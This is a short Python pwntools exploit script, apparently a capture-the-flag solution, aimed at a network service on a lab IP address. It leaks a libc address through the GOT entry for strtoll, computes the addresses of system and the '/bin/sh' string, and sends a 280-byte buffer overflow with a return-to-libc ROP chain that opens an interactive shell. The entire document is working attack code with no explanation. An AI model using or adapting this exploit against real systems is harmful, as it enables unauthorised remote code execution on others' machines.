#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)


r.recvuntil(":")
strtoll_got = 0x601038
strtoll_off = 0x3b3c0
r.sendline(hex(strtoll_got))
r.recvuntil(":")
libc =int(r.recvuntil("\n"),16) - strtoll_off
print "libc:",hex(libc)
system_off = 0x45390
system = libc + system_off
pop_rdi = 0x0000000000400853
sh_off = 0x18cd57
sh = libc + sh_off
payload = "a"*280 + p64(pop_rdi) + p64(sh) + p64(system)
r.recvuntil(":")
r.sendline(payload)
r.interactive()
